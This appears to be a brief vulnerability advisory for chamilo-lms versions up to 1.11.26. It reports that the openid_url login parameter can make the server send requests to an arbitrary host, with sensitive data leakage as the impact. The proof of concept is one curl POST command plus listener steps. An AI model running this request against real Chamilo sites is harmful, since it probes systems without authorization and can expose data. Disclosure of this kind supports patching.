### Chamilo-lms

- **Application**: chamilo-lms <=1.11.26
- **Threat Impact**: Sensitive data leakage
- **POC**:
  1. Listen on 8888 on server side
  1. `curl -X POST http://site/index.php -d "openid_url=http%3A%2F%2Flocalhost%3A8888&submit=&_qf__openid_login="`
  1. Receive a request on server side. 



